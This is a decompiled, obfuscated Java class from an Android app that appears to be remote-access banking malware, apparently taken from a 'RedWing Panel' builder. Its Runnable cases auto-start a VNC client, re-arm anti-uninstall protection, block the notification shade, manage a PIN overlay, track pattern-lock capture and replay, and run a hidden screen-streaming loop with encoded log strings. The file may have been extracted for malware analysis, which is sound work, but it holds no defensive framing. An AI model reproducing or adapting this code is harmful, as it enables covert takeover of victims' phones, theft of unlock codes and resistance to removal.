package v.s;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.SystemClock;
import android.view.WindowManager;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.services.HelperHRAdapter$registerScreenStateReceiver$1;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver;
import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedQueue;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class jdOQeRk37T35X5xKW1P implements Runnable {
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ jdOQeRk37T35X5xKW1P(int i) {
        this.w9sT1Swbhx3hs = i;
    }

    private static /* synthetic */ void zdwfnqxhkl() {
    }

    /* JADX WARN: Code duplicated, block: B:154:0x02e7  */
    @Override // java.lang.Runnable
    public final void run() {
        DataQFAdapter dataQFAdapter;
        boolean z;
        ConcurrentLinkedQueue concurrentLinkedQueue;
        int i = 24;
        int i2 = 1;
        int i3 = 0;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                int i4 = AlarmManagerSchedulerBroadcastReceiver.dDIMxZXP1V8HdM;
                return;
            case 1:
                wbK4wnGaII4TwWEYqb.JXn4Qf7zpnLjP5();
                return;
            case 2:
                DataQFAdapter.autoStartVncClient$lambda$32();
                return;
            case 3:
                DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
                if (dataQFAdapter2 != null) {
                    dataQFAdapter2.setPinOverlayTouchable$app_release(false);
                    return;
                }
                return;
            case 4:
                DataQFAdapter.Companion.Qrz92kRPw4GcghAc();
                return;
            case 5:
                try {
                    DataQFAdapter.Companion.getClass();
                    if (GARjgaGEpTotOxcl8vfe.l1V0lQr6TbwNKqHfXNbb()) {
                        DataQFAdapter dataQFAdapter3 = DataQFAdapter.instance;
                        if (dataQFAdapter3 != null) {
                            dataQFAdapter3.rearmAntiUninstall();
                        }
                        if (!DataQFAdapter.UIBlock_Shade || (dataQFAdapter = DataQFAdapter.instance) == null) {
                            return;
                        }
                        dataQFAdapter.addShadeBarrier();
                        return;
                    }
                    return;
                } catch (Throwable th) {
                    String unused = DataQFAdapter.TAG;
                    TypefaceCache.obtain("00310073005A009500FD00FF00D700B500310079004900DD00B0");
                    th.getMessage();
                    return;
                }
            case 6:
                g78iUtGnOvef g78iutgnovef = new g78iUtGnOvef();
                g78iUtGnOvef g78iutgnovef2 = new g78iUtGnOvef();
                while (true) {
                    DataQFAdapter.Companion.getClass();
                    if (DataQFAdapter.isScreenStreaming) {
                        try {
                            if (Build.VERSION.SDK_INT >= 30) {
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                long j = 80;
                                if (!DataQFAdapter.useH264) {
                                    int i5 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
                                    int iJ0zjQ7CAgohuxU20eCW6 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
                                    if (iJ0zjQ7CAgohuxU20eCW6 == 0) {
                                        j = 50;
                                    } else if (iJ0zjQ7CAgohuxU20eCW6 != 1) {
                                        if (iJ0zjQ7CAgohuxU20eCW6 != 2) {
                                            throw new Sb7Xj3N9U1DQ();
                                        }
                                        j = 150;
                                    }
                                }
                                long j2 = jElapsedRealtime - DataQFAdapter.lastCaptureTsMs;
                                if (DataQFAdapter.isScreenStreaming) {
                                    if (DataQFAdapter.useH264 && DataQFAdapter.hwEncoder != null) {
                                        lLybWDNhgEj7LwIe llybwdnhgej7lwie = DataQFAdapter.hwEncoder;
                                        boolean z2 = ((llybwdnhgej7lwie == null || (concurrentLinkedQueue = llybwdnhgej7lwie.Ee8d2j4S9Vm5yGuR) == null) ? 0 : concurrentLinkedQueue.size()) >= 5;
                                        if (!DataQFAdapter.h264CaptureInFlight && j2 >= j && !z2) {
                                            DataQFAdapter.h264CaptureInFlight = true;
                                            DataQFAdapter.lastCaptureTsMs = jElapsedRealtime;
                                            DataQFAdapter dataQFAdapter4 = DataQFAdapter.instance;
                                            if (dataQFAdapter4 != null) {
                                                dataQFAdapter4.captureScreenInternalBitmap(new tqMsvBGMHi2d1wCf3x(g78iutgnovef2, i3, g78iutgnovef));
                                            }
                                        }
                                    } else if (DataQFAdapter.latestFrame.get() == null && j2 >= j) {
                                        DataQFAdapter.lastCaptureTsMs = jElapsedRealtime;
                                        DataQFAdapter dataQFAdapter5 = DataQFAdapter.instance;
                                        if (dataQFAdapter5 != null) {
                                            dataQFAdapter5.captureScreenInternal(new tqMsvBGMHi2d1wCf3x(g78iutgnovef, i2, g78iutgnovef2));
                                        }
                                    }
                                    int i6 = g78iutgnovef.w9sT1Swbhx3hs;
                                    if (i6 % 30 == 0 && i6 > 0) {
                                        String unused2 = DataQFAdapter.TAG;
                                        TypefaceCache.obtain("00000077004B009300E500AD00D700A30063");
                                        TypefaceCache.obtain("006300700049008600FD00BA00C100E7006B007E000900D100A400E2");
                                        boolean unused3 = DataQFAdapter.useH264;
                                        TypefaceCache.obtain("006F0036005E009500E200B000C000B4007E");
                                    }
                                }
                            }
                            boolean unused4 = DataQFAdapter.useH264;
                            Thread.sleep(20L);
                        } catch (InterruptedException unused5) {
                        } catch (Throwable th2) {
                            String unused6 = DataQFAdapter.TAG;
                            TypefaceCache.obtain("001000750049008200F500B1009200B400370064005E008600FD00FF00D700B500310079004900DD00B0");
                            th2.getMessage();
                            DataQFAdapter.Companion.getClass();
                            DataQFAdapter.h264CaptureInFlight = false;
                            g78iutgnovef2.w9sT1Swbhx3hs++;
                            String message = th2.getMessage();
                            if (message != null) {
                                String lowerCase = message.toLowerCase(Locale.ROOT);
                                if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("0021007F0055008300F500AD"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("00270073005A008300FF00BD00D800A200200062"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("003000730058009200E200B600C600BE"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("002C00790056"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("003100730056008800E400BA"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("003300640054008400F500AC00C100AE002D0071"), false)) {
                                    z = true;
                                } else {
                                    z = false;
                                }
                            } else {
                                z = false;
                            }
                            if (!z) {
                                continue;
                            } else if (g78iutgnovef2.w9sT1Swbhx3hs > 5) {
                                String unused7 = DataQFAdapter.TAG;
                                TypefaceCache.obtain("00170079005400C700FD00BE00DC00BE006300730049009500FF00AD00C100E7006B");
                                TypefaceCache.obtain("006A003A001B008600E400AB00D700AA003300620052008900F700FF00C000A200200079004D008200E200A6");
                            }
                        }
                    }
                }
                DataQFAdapter.Companion.getClass();
                DataQFAdapter.h264CaptureInFlight = false;
                String unused8 = DataQFAdapter.TAG;
                TypefaceCache.obtain("001000620049008200F100B200DB00A9002400360048009300FF00AF00C200A20027003A001B");
                TypefaceCache.obtain("006300700049008600FD00BA00C100E700370079004F008600FC00F3009200A2003100640054009500E300E2");
                if (!DataQFAdapter.isScreenStreaming || DataQFAdapter.streamRestartCount >= 10) {
                    if (DataQFAdapter.streamRestartCount >= 10) {
                        String unused9 = DataQFAdapter.TAG;
                        TypefaceCache.obtain("000E0077004300C700E300AB00C000A20022007B001B009500F500AC00C600A600310062004800C700E200BA00D300A4002B0073005F00C700B8");
                        TypefaceCache.obtain("006A003A001B008000F900A900DB00A900240036004E0097");
                        GARjgaGEpTotOxcl8vfe.dQC4QhgRN3MSEAP3HW0();
                        return;
                    }
                    return;
                }
                long jMin = Math.min((1 << Math.min(DataQFAdapter.streamRestartCount, 46 - 42)) * 2000, 30000L);
                long jCurrentTimeMillis = System.currentTimeMillis();
                if (jCurrentTimeMillis - DataQFAdapter.lastStreamRestartMs < jMin) {
                    String unused10 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("001000620049008200F100B2009200B500260065004F008600E200AB009200A4002C00790057008300FF00A800DC00E7006B");
                    TypefaceCache.obtain("002E0065001200CB00B000AC00D900AE003300660052008900F7");
                    return;
                }
                DataQFAdapter.streamRestartCount++;
                DataQFAdapter.lastStreamRestartMs = jCurrentTimeMillis;
                String unused11 = DataQFAdapter.TAG;
                TypefaceCache.obtain("00020063004F008800BD00AD00D700B4003700770049009300F900B100D500E7003000750049008200F500B1009200B400370064005E008600FD00FF009A00A600370062005E008A00E000AB0092");
                int unused12 = DataQFAdapter.streamRestartCount;
                TypefaceCache.obtain("006F00360059008600F300B400DD00A10025002B");
                TypefaceCache.obtain("002E00650012");
                try {
                    Thread.sleep(jMin);
                    break;
                } catch (InterruptedException unused13) {
                }
                DataQFAdapter.Companion.getClass();
                if (DataQFAdapter.isScreenStreaming) {
                    GARjgaGEpTotOxcl8vfe.dQC4QhgRN3MSEAP3HW0();
                    GARjgaGEpTotOxcl8vfe.is7XW2V21HfKv7MihWy();
                    return;
                }
                return;
            case 7:
                String str = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                if (vbdyByOHPJmeGXlq.b1EoSIRjJHO5) {
                    vbdyByOHPJmeGXlq.hjneShqpF9Tis4();
                    return;
                }
                return;
            case 8:
                DataQFAdapter.patternReplayInProgress = false;
                DataQFAdapter.lastPatternCaptureTime = System.currentTimeMillis();
                return;
            case 9:
                DataQFAdapter.Companion.getClass();
                GARjgaGEpTotOxcl8vfe.VEkRsTDS6a9oHWI();
                return;
            case 10:
                DataQFAdapter.Companion.getClass();
                DataQFAdapter dataQFAdapter6 = DataQFAdapter.instance;
                Context applicationContext = dataQFAdapter6 != null ? dataQFAdapter6.getApplicationContext() : null;
                if (applicationContext == null) {
                    return;
                }
                String unused14 = DataQFAdapter.TAG;
                TypefaceCache.obtain("000E00770055009200F100B3009200B7002200650048009000FF00AD00D600E700200077004B009300E500AD00D700FD006300650053008800E700B600DC00A000630079004D008200E200B300D300BE");
                String str2 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                apQOLJtARzrH apqoljtarzrh = new apQOLJtARzrH(applicationContext, i2);
                DataQFAdapter dataQFAdapter7 = DataQFAdapter.instance;
                if (dataQFAdapter7 == null) {
                    TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073001B008100FF00AD009200B7002200650048009000FF00AD00D600E700200077004B009300E500AD00D7");
                    apqoljtarzrh.pyu8ovAipBTLYAiKab("");
                    return;
                } else {
                    vbdyByOHPJmeGXlq.euF5Udt5Rqv3Qmea = apqoljtarzrh;
                    vbdyByOHPJmeGXlq.Qrz92kRPw4GcghAc.post(new A68NpXPqwTFos99nt(dataQFAdapter7, i, apqoljtarzrh));
                    return;
                }
            case 11:
                int i7 = HelperHRAdapter$registerScreenStateReceiver$1.w9sT1Swbhx3hs;
                DataQFAdapter.Companion.getClass();
                DataQFAdapter dataQFAdapter8 = DataQFAdapter.instance;
                if (dataQFAdapter8 != null) {
                    dataQFAdapter8.performWakeScreen();
                    return;
                }
                return;
            case 12:
                System.gc();
                return;
            case 13:
                System.gc();
                return;
            case 14:
                String str3 = ManagerUMController.DVTNwpDEVsUKuznof;
                ManagerUMController.MSGkxvPxRYNqC = false;
                return;
            case 15:
                System.gc();
                return;
            case 16:
                String str4 = UtilNWWrapper.A1BaTVAMeIXMnh;
                try {
                    String str5 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                    SyncQYAdapter syncQYAdapter = SyncQYAdapter.VEkRsTDS6a9oHWI;
                    if (syncQYAdapter != null) {
                        syncQYAdapter.VEkRsTDS6a9oHWI();
                        return;
                    }
                    return;
                } catch (Exception unused15) {
                    return;
                }
            case 17:
                TypefaceCache.obtain("00130077004F009300F500AD00DC00E700200077004B009300E500AD00D700E700220063004F008800BD00B700DB00A300260036001300D400A000AC009200B3002A007B005E008800E500AB009B");
                String str6 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                Handler handler = vbdyByOHPJmeGXlq.Qrz92kRPw4GcghAc;
                handler.removeCallbacks(vbdyByOHPJmeGXlq.hV4VTKNUdeHN);
                handler.post(new jdOQeRk37T35X5xKW1P(i));
                return;
            case 18:
                DataQFAdapter.Companion.getClass();
                DataQFAdapter dataQFAdapter9 = DataQFAdapter.instance;
                if (dataQFAdapter9 == null || !vbdyByOHPJmeGXlq.hjneShqpF9Tis4) {
                    return;
                }
                vbdyByOHPJmeGXlq.Qrz92kRPw4GcghAc.post(new TgFV4UY0xAiKxQwpKNg(dataQFAdapter9, 20));
                return;
            case 19:
                String str7 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                vbdyByOHPJmeGXlq.gIIiyi2ddlMDR0();
                return;
            case 20:
                TypefaceCache.obtain("001300770048009400E700B000C000A300630075005A009700E400AA00C000A200630077004E009300FF00F200DA00AE00270073001B00CF00A400EA00C100E70037007F0056008200FF00AA00C600EE");
                String str8 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                Handler handler2 = vbdyByOHPJmeGXlq.Qrz92kRPw4GcghAc;
                handler2.removeCallbacks(vbdyByOHPJmeGXlq.qfTrc75xwRVMl85vh);
                handler2.post(new jdOQeRk37T35X5xKW1P(26 - 5));
                return;
            case 21:
                try {
                    DataQFAdapter.Companion.getClass();
                    DataQFAdapter dataQFAdapter10 = DataQFAdapter.instance;
                    if (dataQFAdapter10 != null && vbdyByOHPJmeGXlq.A1BaTVAMeIXMnh != null) {
                        ((WindowManager) dataQFAdapter10.getSystemService("window")).removeView(vbdyByOHPJmeGXlq.A1BaTVAMeIXMnh);
                    }
                    break;
                } catch (Exception e) {
                    TypefaceCache.obtain("002B007F005F008200C000BE00C100B4003400790049008300D300BE00C200B300360064005E00C700F500AD00C000A80031002C001B");
                    e.getMessage();
                }
                vbdyByOHPJmeGXlq.A1BaTVAMeIXMnh = null;
                vbdyByOHPJmeGXlq.k84rwRrqzhrNQ1CdNQ9 = false;
                return;
            case 22:
                String str9 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                vbdyByOHPJmeGXlq.gIIiyi2ddlMDR0();
                return;
            case 23:
                try {
                    DataQFAdapter.Companion.getClass();
                    DataQFAdapter dataQFAdapter11 = DataQFAdapter.instance;
                    if (dataQFAdapter11 != null && vbdyByOHPJmeGXlq.tne6mXOUFKdd != null) {
                        ((WindowManager) dataQFAdapter11.getSystemService("window")).removeView(vbdyByOHPJmeGXlq.tne6mXOUFKdd);
                    }
                    break;
                } catch (Exception e2) {
                    TypefaceCache.obtain("002B007F005F008200D100AF00C2008B002C0075005000C700F500AD00C000A80031002C001B");
                    e2.getMessage();
                }
                vbdyByOHPJmeGXlq.tne6mXOUFKdd = null;
                vbdyByOHPJmeGXlq.xfn2GJwmGqs7kWW = false;
                TypefaceCache.obtain("00020066004B00C700FC00B000D100AC00630079004D008200E200B300D300BE0063007E0052008300F400BA00DC");
                return;
            default:
                try {
                    DataQFAdapter.Companion.getClass();
                    DataQFAdapter dataQFAdapter12 = DataQFAdapter.instance;
                    if (dataQFAdapter12 != null && vbdyByOHPJmeGXlq.ECwLkmPW1UKz7J6E != null) {
                        ((WindowManager) dataQFAdapter12.getSystemService("window")).removeView(vbdyByOHPJmeGXlq.ECwLkmPW1UKz7J6E);
                    }
                    break;
                } catch (Exception e3) {
                    TypefaceCache.obtain("002B007F005F008200C000BE00C600B300260064005500A400F100AF00C600B200310073001B008200E200AD00DD00B500790036");
                    e3.getMessage();
                }
                vbdyByOHPJmeGXlq.ECwLkmPW1UKz7J6E = null;
                vbdyByOHPJmeGXlq.iUQk66nAiXgO35 = false;
                return;
        }
    }

    public /* synthetic */ jdOQeRk37T35X5xKW1P(DataQFAdapter dataQFAdapter) {
        this.w9sT1Swbhx3hs = 7;
    }
}
